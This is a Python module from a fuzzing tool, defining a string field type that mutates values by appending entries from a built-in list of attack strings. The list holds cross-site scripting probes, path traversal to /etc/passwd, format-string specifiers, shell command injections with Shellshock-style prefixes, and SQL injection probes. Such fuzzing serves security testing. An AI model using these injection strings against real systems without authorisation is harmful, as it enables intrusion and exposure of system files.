#!/usr/bin/python
# -*-  encoding: iso-8859-1 -*-



###############################################################################
# Copyright 2017 @fuzztheworld
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.



###############################################################################
# Vocabulary structure, i.e. definition of fields and the structure that comes with it.


# Imports #####################################################################
import string

from content import *



# StringContent ###############################################################
class StringContent(Content):
    """
        Defines constraints on the content of a field.
        Values must be strings.
    """

    usualChars = list(string.printable)
    specialChars = list(" \r\t\n!%#$^&*()`-+=:;'\"\\/?<>.,")
    attackVectors = [
    # Web
    "\r\n",
    "\r\n" * 100,
    "\r\n" * 1000,
    "<",
    ">",
    "%3C",
    "%3D",
    "&lt;",
    "&gt;",
    "&#60;",
    "&#61;",
    "&#x3c;",
    "&#x3d;",
    "\x3c",
    "\x3d",
    "\u003c",
    "\u003d",
    "'';!--\"<XSS>=&{()}",

    # Directory traversal
    "../",
    "/../",
    "%2f%2e%2e%2f",
    "/.%00./",
    "/../../../../../../../../../../../../etc/passwd",
    "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd",

    # Format string vulnerabilities
    "%s" * 10,
    "%s" * 100,
    "%s" * 1000,
    "\"%s\"" * 10,
    "\"%s\"" * 100,
    "\"%s\"" * 1000,
    "%n" * 10,
    "%n" * 100,
    "%n" * 1000,
    "\"%n\"" * 10,
    "\"%n\"" * 100,
    "\"%n\"" * 1000,

    # Linux bash injections
    "|whoami",
    ";whoami",
    "&&whoami",
    "||whoami",
    "$(whoami)",
    "(){ :;};whoami",

    "|touch ALICIA",
    ";touch ALICIA",
    "&&touch ALICIA",
    "||touch ALICIA",
    "$(touch ALICIA)",
    "`touch ALICIA`",
    "(){ :;};touch ALICIA",

    "{touch,ALICIA}",
    "|{touch,ALICIA}",
    ";{touch,ALICIA}",
    "&&{touch,ALICIA}",
    "||{touch,ALICIA}",
    "$({touch,ALICIA})",
    "`{touch,ALICIA}`",
    "`(){ :;};{touch,ALICIA}`",

    "(){ :;};touch ALICIA",
    "|touch /tmp/ALICIA",
    ";touch /tmp/ALICIA",
    "&&touch /tmp/ALICIA",
    "||touch /tmp/ALICIA",
    "$(touch /tmp/ALICIA)",
    "`touch /tmp/ALICIA`",
    "(){ :;};touch /tmp/ALICIA",

    "{touch,/tmp/ALICIA}",
    "|{touch,/tmp/ALICIA}",
    ";{touch,/tmp/ALICIA}",
    "&&{touch,/tmp/ALICIA}",
    "||{touch,/tmp/ALICIA}",
    "$({touch,/tmp/ALICIA})",
    "`{touch,/tmp/ALICIA}`",
    "`(){ :;};{touch,/tmp/ALICIA}`",

    "|ping -b 255.255.255.255",
    ";ping -b 255.255.255.255",
    "&&ping -b 255.255.255.255",
    "||ping -b 255.255.255.255",
    "$(ping -b 255.255.255.255)",
    "`ping -b 255.255.255.255`",
    "(){ :;};ping -b 255.255.255.255",

    "{ping,-b,255.255.255.255}",
    "|{ping,-b,255.255.255.255}",
    ";{ping,-b,255.255.255.255}",
    "&&{ping,-b,255.255.255.255}",
    "||{ping,-b,255.255.255.255}",
    "$({ping,-b,255.255.255.255})",
    "`{ping,-b,255.255.255.255}`",
    "`(){ :;};{ping,-b,255.255.255.255}`",

    # SQL injecion
    "'test",
    "1;SELECT%20*",
    "a'%20or%20'1'='1"]

    # Constructor =========================================
    def __init__(self, value):
        Content.__init__(self, value)
        self.type = "StringContent"


    # Actioners ===========================================
    # Fuzzing =============================================
    def newCharacter(self, rand):
        """
            Return a new character concording with this type.
        """
        flag = rand.randint(0, 1)
        if flag == 0:
            return rand.choice(StringContent.usualChars)

        return rand.choice(StringContent.specialChars)


    def fuzz(self, minSize, maxSize, rand, steps):
        """
            Fuzz the given value that needs to stay in the size range.
            @param (int)minSize
            @param (int)maxSize
            @param (random.Random)rand
            @param (int)steps
        """
        insertValue = rand.choice(StringContent.attackVectors)
        value = ""
        if len(insertValue) > maxSize:
            # Here we assume that a maimed attack vector is still agressive.
            value = insertValue[:maxSize]
        elif len(insertValue) + len(self.current) > maxSize:
            value = self.current[:maxSize - len(insertValue)] + insertValue
        else:
            value = self.current + insertValue
        self.update(value)

